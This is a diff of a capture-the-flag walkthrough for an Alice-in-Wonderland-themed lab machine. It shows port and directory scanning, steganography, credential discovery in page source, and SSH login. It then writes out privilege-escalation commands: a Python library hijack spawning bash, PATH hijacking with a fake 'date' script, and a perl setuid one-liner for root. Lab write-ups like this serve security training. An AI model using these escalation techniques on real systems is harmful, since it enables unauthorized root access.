@@ -16,52 +16,52 @@ You will also find a screenshot of the room details attached below.
 
 To begin the enumeration process, I conducted a basic port scan using the following Nmap command. The results show two open ports requiring further investigation :
 
-> `nmap -sV -sC -O 10.67.165.26
+> `nmap -sV -sC -O 10.67.165.26`
 
-![[images/nmap.png]]
+![](images/nmap.png)
 
  We will also use the gobuster tool on the website. 
- >`gobuster dir -u http://10.67.165.26/ -w wordlists/common.txt
+ >`gobuster dir -u http://10.67.165.26/ -w wordlists/common.txt`
 
 
-![[gobuster.png]]
+![](images/gobuster.png)
 
 Now we go to the /img file shown by gobuster tool  and load the following image. 
-> `http://10.67.165.26/img
-> `http://10.67.165.26/img/white_rabbit_1.jpg
-> `wget http://10.67.165.26/img/white_rabbit_1.jpg
+> `http://10.67.165.26/img`
+> `http://10.67.165.26/img/white_rabbit_1.jpg`
+> `wget http://10.67.165.26/img/white_rabbit_1.jpg`
 
-![[2025-12-11_11-48.png]]
+![](images/2025-12-11_11-48.png)
 
-![[2025-12-11_11-49.png]]
+![](images/2025-12-11_11-49.png)
 
 After downloading the image, we will use the steghide tool like below command. 
-> `steghide info white_rabbit_1.jpg
-> `steghide extract -sf white_rabbit_1.jpg
-> `cat hint.txt
+> `steghide info white_rabbit_1.jpg`
+> `steghide extract -sf white_rabbit_1.jpg`
+> `cat hint.txt`
 
-![[2025-12-11_11-43.png]]
+![](images/2025-12-11_11-43.png)
 
 Now that we have read the hint in the text we can follow it in to the page. 
-> `http://10.67.165.26/r/a/b/b/i/t/
+> `http://10.67.165.26/r/a/b/b/i/t/`
 
-![[2025-12-11_15-50.png]]
+![](images/2025-12-11_15-50.png)
 
 Then go to the source code of the page and we can see the username and password 
 
 
-![[2025-12-11_11-53.png]]
+![](images/2025-12-11_11-53.png)
 
 Now we will login via the SSH port using the username password we obtained from the page source code 
->`ssh alice@10.67.165.26
+>`ssh alice@10.67.165.26`
 
-![[2025-12-11_11-56.png]]
+![](images/2025-12-11_11-56.png)
 
 Now we have logged in as a alice user and we can read the user.txt flag
-> `cat /root/user.txt
+> `cat /root/user.txt`
 
 
-![[2025-12-11_12-14.png]]
+![](images/2025-12-11_12-14.png)
 
 So how did I switch the user ?
 
@@ -73,43 +73,43 @@ So how did I switch the user ?
 
 It gave me the user rabbit which means I successfully managed to switch my first privilege.
 
->`cat > random.py << EOF
->`import os 
->`os.system("/bin/bash")
->`EOF
+>`cat > random.py << EOF`
+>`import os`
+>`os.system("/bin/bash")`
+>`EOF`
 
->`sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+>`sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py`
 
-![[2025-12-11_12-20.png]]
+![](images/2025-12-11_12-20.png)
 
 Now we made a date file so that we can read the password file and switch to hatter user
 you can follow below commands. 
 
->`cat > date << EOF
-> `#!/bin/bash
-> `/bin/bash
-> `EOF
+>`cat > date << EOF`
+> `#!/bin/bash`
+> `/bin/bash`
+> `EOF`
 > 
-` chmod +x date
-` exprt PATH=/home/rabbit:$PATH
-` ./teaParty
+` chmod +x date`
+` exprt PATH=/home/rabbit:$PATH`
+` ./teaParty`
 
 We now have permission to access the hatter folder and read the password.txt
->`cd /home/hatter
->`cat password.txt
+>`cd /home/hatter`
+>`cat password.txt`
 
-![[2025-12-11_13-01.png]]
+![](images/2025-12-11_13-01.png)
 
 we will use the command :
->`getcap -r / 2>/dev/null
+>`getcap -r / 2>/dev/null`
 
-![[2025-12-11_13-02.png]]
+![](images/2025-12-11_13-02.png)
 There is perl capability that we can exploit.
->`https://gtfobins.github.io/gtfobins/perl/
+>`https://gtfobins.github.io/gtfobins/perl/`
 
->`perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+>`perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'`
 
-![[2025-12-11_12-41.png]]
+![](images/2025-12-11_12-41.png)
 
 
 
